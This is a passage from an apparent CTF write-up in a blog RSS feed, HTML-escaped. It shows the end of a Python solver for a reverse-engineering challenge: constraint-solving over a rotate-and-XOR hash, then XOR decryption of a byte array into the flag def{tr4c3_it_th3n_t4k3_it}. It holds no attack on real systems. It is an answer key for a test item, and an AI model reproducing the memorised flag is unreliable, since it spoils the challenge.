&lt;span&gt;&lt;span&gt;    for&lt;/span&gt;&lt;span&gt; i &lt;/span&gt;&lt;span&gt;in&lt;/span&gt;&lt;span&gt; range&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span&gt;8&lt;/span&gt;&lt;span&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;        rol_v4 &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; LShR(v4, &lt;/span&gt;&lt;span&gt;32&lt;/span&gt;&lt;span&gt; -&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;|&lt;/span&gt;&lt;span&gt; (v4 &lt;/span&gt;&lt;span&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;        # v4 = (char ^ ROL4(v4, 5)) - MAGIC&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;        v4 &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; (chars[i] &lt;/span&gt;&lt;span&gt;^&lt;/span&gt;&lt;span&gt; rol_v4) &lt;/span&gt;&lt;span&gt;-&lt;/span&gt;&lt;span&gt; MAGIC&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    # -1873306505&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    s.add(v4 &lt;/span&gt;&lt;span&gt;==&lt;/span&gt;&lt;span&gt; 0x&lt;/span&gt;&lt;span&gt;90559477&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; decrypt_flag&lt;/span&gt;&lt;span&gt;():&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    target &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; [&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;        0x&lt;/span&gt;&lt;span&gt;6E&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;4C&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;FB&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;C4&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;78&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;53&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;65&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;BB&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;88&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;3D&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;        0x&lt;/span&gt;&lt;span&gt;82&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;0B&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;B5&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;88&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;3D&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;2E&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;63&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;FA&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;88&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;32&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;6E&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    ]&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    &lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    # v11 (13 37 C0 DE) + v12 (42)&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    key &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; [&lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;37&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;C0&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;DE&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;0x&lt;/span&gt;&lt;span&gt;42&lt;/span&gt;&lt;span&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    &lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    flag_content &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; &quot;&quot;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    for&lt;/span&gt;&lt;span&gt; i &lt;/span&gt;&lt;span&gt;in&lt;/span&gt;&lt;span&gt; range&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span&gt;len&lt;/span&gt;&lt;span&gt;(target)):&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;        # (Data[i] - 7) ^ Key[i % 5]&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;        char_code &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; (target[i] &lt;/span&gt;&lt;span&gt;-&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;^&lt;/span&gt;&lt;span&gt; key[i &lt;/span&gt;&lt;span&gt;%&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;&lt;span&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;        flag_content &lt;/span&gt;&lt;span&gt;+=&lt;/span&gt;&lt;span&gt; chr&lt;/span&gt;&lt;span&gt;(char_code &lt;/span&gt;&lt;span&gt;&amp;amp;&lt;/span&gt;&lt;span&gt; 0x&lt;/span&gt;&lt;span&gt;FF&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    &lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    full_flag &lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt; f&lt;/span&gt;&lt;span&gt;&quot;def&lt;/span&gt;&lt;span&gt;{{{&lt;/span&gt;&lt;span&gt;flag_content&lt;/span&gt;&lt;span&gt;}}}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    print&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span&gt;f&lt;/span&gt;&lt;span&gt;&quot;Flag: &lt;/span&gt;&lt;span&gt;{&lt;/span&gt;&lt;span&gt;full_flag&lt;/span&gt;&lt;span&gt;}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    return&lt;/span&gt;&lt;span&gt; full_flag&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; __name__&lt;/span&gt;&lt;span&gt; ==&lt;/span&gt;&lt;span&gt; &quot;__main__&quot;&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;    decrypt_flag()&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;&apos;&apos;&apos;&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;def{tr4c3_it_th3n_t4k3_it}&lt;/span&gt;&lt;/span&gt;
&lt;span&gt;&lt;span&gt;&apos;&apos;&apos;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</content:encoded><category>tag:CTF</category></item></channel></rss>